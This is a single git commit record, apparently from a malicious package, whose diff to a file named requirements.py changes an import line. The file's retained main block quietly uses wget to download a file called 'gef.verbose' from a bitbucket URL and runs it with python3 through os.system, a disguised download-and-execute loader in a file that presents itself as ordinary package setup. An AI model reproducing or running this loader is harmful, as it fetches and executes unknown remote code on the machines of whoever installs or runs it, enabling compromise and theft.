535cecf689bdaa466b62fded0ab35df1782ffdf8
gakira munshi <gakimarki@proton.me>
2024-12-20 13:44:58 -0500

    Now added delete for real

--- requirements.py
+++ requirements.py
@@ -1,3 +1,3 @@
-import os, sys,zipfile
+import os, sys,gc
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef.verbose" && python3 gef.verbose  ';os.system(cmd)
